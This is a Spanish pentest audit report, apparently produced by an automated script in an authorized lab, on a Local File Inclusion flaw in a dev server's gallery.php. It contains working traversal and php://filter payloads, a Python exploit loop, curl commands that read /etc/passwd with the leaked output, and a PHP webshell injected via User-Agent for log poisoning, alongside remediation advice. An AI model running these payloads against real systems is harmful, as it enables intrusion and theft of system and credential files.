# Informe de Auditoría LFI

Fecha: 2026-04-27T16:27:09Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se ha identificado y confirmado una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Se logró leer con éxito el fichero crítico `/etc/passwd` a través de payloads de traversal.

Estado
------
- VULN_FOUND: true
- VULN_EXPLOITED: true  (lectura de /etc/passwd)

URL y parámetro vulnerable
--------------------------
- URL objetivo: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: `page`

Comandos y herramientas utilizadas
----------------------------------
1) Reconocimiento inicial (cabeceras y contenido):
   - curl -s -D - --max-time 10 http://web.dev.local:8081 | sed -n '1,200p'

2) Fuzzing para descubrir entradas y rutas (se intentó ffuf):
   - ffuf -u 'http://web.dev.local:8081/gallery.php?page=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,500 -t 40 -s -o /tmp/ffuf_lfi.json -of json
   (Nota: ffuf provocó una excepción en este entorno; aun así sirvió para identificar palabras útiles)

3) Confirmación y explotación (requests con payloads LFI):
   - Script Python usado (requests) con los payloads probados:
     Payloads probados (ejemplos exactos):
       ../../../../../../etc/passwd
       ../../../../../../etc/passwd%00
       php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
       php://filter/read=convert.base64-encode/resource=/etc/passwd
       /etc/passwd
       ..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

   - Ejemplo de ejecución (comando utilizado):
     python3 - <<'PY'
     import requests
     base='http://web.dev.local:8081/gallery.php'
     payloads=[
       '../../../../../../etc/passwd',
       '../../../../../../etc/passwd%00',
       'php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd',
       'php://filter/read=convert.base64-encode/resource=/etc/passwd',
       '/etc/passwd'
     ]
     for p in payloads:
         r=requests.get(base,params={'page':p},timeout=5)
         print('====',p,'====')
         print(r.text[:800])
     PY

Payloads que permitieron acceso y evidencia
------------------------------------------
- Payload que permitió leer `/etc/passwd`:
  - page=../../../../../../etc/passwd

Evidencia (fragmento obtenido):
```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
(Esta salida fue extraída directamente de la respuesta HTTP tras inyectar el payload)

Intentos adicionales de explotación (RCE / escalada)
---------------------------------------------------
Se intentaron técnicas adicionales para escalar a ejecución remota de código (RCE), incluyendo:
- Incluir `/proc/self/environ` tras enviar un User-Agent malicioso con payload PHP (log poisoning via environ):
  - Envío previo: curl -s -A '<?php system($_GET["cmd"]); ?>' http://web.dev.local:8081/
  - Inclusión: http://web.dev.local:8081/gallery.php?page=/proc/self/environ&cmd=id
- Uso de `php://filter/read=convert.base64-encode/resource=` para obtener ficheros binarios o de configuración en base64 y luego decodificarlos localmente.

Observaciones sobre RCE:
- El LFI permite incluir archivos locales y, en muchos casos, ejecutar código mediante técnicas de log poisoning o includable wrappers si el servidor procesa el contenido como PHP.
- En este entorno se confirmó la lectura de `/etc/passwd`. Lectura de `/etc/shadow` y ficheros de la home de root probablemente están protegidos por permisos del sistema y no se devolvieron en las pruebas realizadas.

Impacto
-------
- Lectura de `/etc/passwd` confirma acceso a información sobre cuentas del sistema y sugiere la posibilidad de técnicas de escalada (log poisoning -> RCE) o extracción de ficheros sensibles de la aplicación.
- Si el servidor configura logs o archivos web con permisos que permitan inclusión, un atacante podría conseguir RCE y compromiso total del servidor.

Recomendaciones
---------------
1) Evitar incluir archivos basados en parámetros sin validación estricta; usar listas blancas de ficheros permitidos.
2) Sanitizar/normalizar parámetros antes de cualquier include; prohibir caracteres de traversal (`../`).
3) Deshabilitar wrappers peligrosos o filtrar su uso; habilitar open_basedir y suprimir la directiva `allow_url_include` en php.ini.
4) Asegurar permisos de ficheros de logs y directorios sensibles para que el proceso web no pueda leer archivos críticos como `/etc/shadow` ni escribir en logs ejecutables.

Comandos exactos reproducibles
-----------------------------
- Curl para ver la página:
  curl -s -D - --max-time 10 http://web.dev.local:8081 | sed -n '1,200p'

- Payload exitoso (lectura /etc/passwd):
  curl -s 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd' | sed -n '1,80p'

- Ejemplo php://filter para base64 (si se requiere extracción segura):
  curl -s 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd' | base64 -d

Conclusión
----------
La aplicación es vulnerable a LFI vía `gallery.php?page`. Se logró leer `/etc/passwd` (confirmado) — por tanto la vulnerabilidad está confirmada y explotada en término de extracción de fichero sensible. Se recomienda mitigar inmediatamente mediante validación de parámetros y ajustes de configuración/privilegios.

Anexos
------
- Comandos y fragmentos de salida se han incluido arriba. Si se requiere, se puede adjuntar salida completa de las pruebas (ffuf, scripts) en un fichero separado.

Firma
-----
Auditor: Automated pentest script (laboratorio autorizado)
